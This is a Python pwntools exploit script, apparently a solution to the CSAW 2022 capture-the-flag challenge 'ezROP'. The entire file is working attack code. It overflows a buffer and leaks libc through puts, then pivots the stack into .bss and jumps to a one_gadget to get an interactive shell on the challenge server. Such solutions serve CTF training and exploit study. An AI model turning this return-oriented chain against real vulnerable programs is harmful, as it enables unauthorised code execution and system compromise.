from concurrent.futures import process
from pwn import *
import sys

elf = ELF("chal/ezROP")
libc = ELF("libc.so.6")
io = process(elf.path)
io = remote("pwn.chal.csaw.io", 5002)

# gdb.attach(io, 'b *0x40152d')

one_gadget = 0xe3afe

bss_base_addr = 0x404080
pop_rdi_ret = 0x4015a3
pop_rsi_r15_ret = 0x4015a1
pop_rsp_r13_r14_r15_ret = 0x40159d
pop_r12_r13_r14_r15_ret = 0x40159c

# libc leak & stack pivot
payload = b'A' * 0x77
payload += b'\n'
payload += p64(pop_rdi_ret)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(pop_rdi_ret)
payload += p64(bss_base_addr + 0x18)
payload += p64(pop_rsi_r15_ret)
payload += p64(0x100)
payload += p64(0)
payload += p64(elf.sym["readn"])
payload += p64(pop_rsp_r13_r14_r15_ret)
payload += p64(bss_base_addr)
io.send(payload)

io.recvuntil(b"CSAW'22!\n")
ret = io.recv(6)
libc.address = u64(ret + b"\x00\x00") - libc.sym["puts"]
print("libc: " + str(hex(libc.address)))

# one gadget
payload = p64(pop_r12_r13_r14_r15_ret)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(libc.address + one_gadget)
io.send(payload)

io.interactive()